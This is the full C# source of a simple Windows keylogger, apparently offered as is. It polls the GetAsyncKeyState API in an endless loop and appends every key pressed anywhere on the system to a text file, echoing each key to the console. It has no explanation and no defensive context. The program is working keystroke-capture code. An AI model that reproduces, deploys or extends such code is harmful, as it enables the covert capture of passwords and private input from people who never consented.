using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        { 
            string filePath = Environment.CurrentDirectory + @"\keyLogs.txt";
            string buff;
            Console.WriteLine($"Key logs are saved in \"{filePath}\"");
            while (true)
            {
                Thread.Sleep(150);
                for (int i = 8; i < 256; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        if (((System.ConsoleKey)i).ToString().Length == 1)
                        {
                            buff = ((System.ConsoleKey)i).ToString();
                        }
                        else 
                        {
                            buff = $"<{((System.ConsoleKey)i).ToString()}>";
                        }

                        File.AppendAllText(filePath, buff);
                        Console.Write(buff);
                    }
                }
            }
        }
    }
}